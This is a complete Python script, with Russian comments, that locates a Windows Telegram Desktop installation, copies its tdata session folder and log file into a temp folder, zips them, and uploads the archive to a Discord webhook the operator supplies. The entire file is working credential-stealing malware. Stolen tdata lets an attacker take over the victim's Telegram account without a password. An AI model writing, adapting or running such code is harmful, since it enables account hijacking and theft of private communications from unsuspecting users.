import os
import shutil
import zipfile
import winreg
import requests
import getpass
from pathlib import Path
from datetime import datetime

def find_telegram_on_drives(drives):
    for drive in drives:
        telegram_path = find_telegram(drive)
        if telegram_path:
            return telegram_path
    return None

def find_telegram(root_path):
    for dirpath, dirnames, filenames in os.walk(root_path):
        if 'Telegram.exe' in filenames:
            return dirpath
    return None

def copy_telegram_files(src_path, dest_path):
    try:
        if os.path.exists(os.path.join(src_path, 'tdata')):
            shutil.copytree(os.path.join(src_path, 'tdata'), os.path.join(dest_path, 'tdata'))
        if os.path.exists(os.path.join(src_path, 'log.txt')):
            shutil.copy(os.path.join(src_path, 'log.txt'), os.path.join(dest_path, 'log.txt'))
    except Exception as e:
        print(f"Error copying files: {e}")

def create_zip_from_folder(folder_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

def send_to_discord(webhook_url, file_path):
    with open(file_path, 'rb') as f:
        requests.post(webhook_url, files={'file': f})

def main():
    # Диски для поиска
    drives = ['C:\\Program Files\\Telegram Desktop\\', 'C:\\Program Files (x86)\\Telegram Desktop\\', 'C:\\', 'D:\\', 'E:\\']
    # Вебхук URL для Discord
    webhook_url = 'ENTER_YOUR_WEBHOOK'

    telegram_path = find_telegram_on_drives(drives)

    if telegram_path:
        print(f": {telegram_path}")

        # Имя текущего пользователя
        user_name = getpass.getuser()
        temp_folder = os.path.join(os.getenv('TEMP'), user_name)

        # Создание временной папки
        if not os.path.exists(temp_folder):
            os.makedirs(temp_folder)

        # Копирование файлов
        copy_telegram_files(telegram_path, temp_folder)

        # Создание zip архива
        current_date = datetime.now().strftime("%Y-%m-%d")
        zip_path = os.path.join(os.getenv('TEMP'), f"{user_name}_{current_date}.zip")
        create_zip_from_folder(temp_folder, zip_path)

        # Отправка на Discord
        send_to_discord(webhook_url, zip_path)

        print("1")
    else:
        print("1")

if __name__ == "__main__":
    main()
